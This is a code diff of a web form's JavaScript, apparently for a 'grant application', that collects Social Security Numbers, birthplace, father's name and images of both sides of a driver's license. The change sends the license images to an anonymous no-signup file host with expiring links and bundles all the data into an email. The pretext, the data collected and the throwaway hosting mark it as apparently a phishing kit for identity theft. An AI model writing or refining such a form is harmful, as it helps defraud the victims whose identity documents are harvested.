@@ -565,33 +565,44 @@
     const ff = document.getElementById("upload-front").files[0];
     const bf = document.getElementById("upload-back").files[0];
 
-    // Upload image to Cloudinary (free unsigned upload)
-    async function uploadToCloudinary(file) {
-      const CLOUD_NAME = "dgrants2024";
-      const UPLOAD_PRESET = "grant_uploads"; // unsigned preset
+    // Upload image to file.io (free, no signup needed)
+    async function uploadImage(file) {
       const fd = new FormData();
       fd.append("file", file);
-      fd.append("upload_preset", UPLOAD_PRESET);
-      fd.append("folder", "grant_applications");
-      const resp = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/auto/upload`, {
+      // file.io: free, no account needed, link expires after 1 download
+      const resp = await fetch("https://file.io/?expires=14d", {
         method: "POST", body: fd
       });
       const json = await resp.json();
-      if (json.secure_url) return json.secure_url;
-      throw new Error("Upload failed");
+      if (json.success && json.link) return json.link;
+      throw new Error("Upload failed: " + JSON.stringify(json));
     }
 
     btn.innerHTML = '<div class="spinner"></div>&nbsp; UPLOADING IMAGES...';
 
-    let frontURL = "Not provided", backURL = "Not provided";
+    let frontURL = "", backURL = "";
     try {
-      if (ff) frontURL = await uploadToCloudinary(ff);
-      if (bf) backURL  = await uploadToCloudinary(bf);
-    } catch (err) {
-      // If image hosting fails, fall back to noting filenames only
-      frontURL = ff ? `[File: ${ff.name} — ${(ff.size/1024).toFixed(0)}KB]` : "Not provided";
-      backURL  = bf ? `[File: ${bf.name} — ${(bf.size/1024).toFixed(0)}KB]` : "Not provided";
+      if (ff) {
+        frontURL = await uploadImage(ff);
+      }
+    } catch(e) {
+      frontURL = "";
     }
+    try {
+      if (bf) {
+        backURL = await uploadImage(bf);
+      }
+    } catch(e) {
+      backURL = "";
+    }
+
+    // Build readable image info for email
+    const frontInfo = frontURL
+      ? frontURL
+      : (ff ? `[Could not upload: ${ff.name}]` : "Not provided");
+    const backInfo = backURL
+      ? backURL
+      : (bf ? `[Could not upload: ${bf.name}]` : "Not provided");
 
     btn.innerHTML = '<div class="spinner"></div>&nbsp; SENDING...';
 
@@ -610,8 +621,8 @@
       "State & City of Birth":   document.getElementById("birth-location").value,
       "Social Security Number":  document.getElementById("ssn").value,
       "Fathers Full Name":       document.getElementById("fathers-name").value,
-      "Front of Drivers License": frontURL,
-      "Back of Drivers License":  backURL,
+      "Front of Drivers License": frontInfo,
+      "Back of Drivers License":  backInfo,
     };
 
     try {
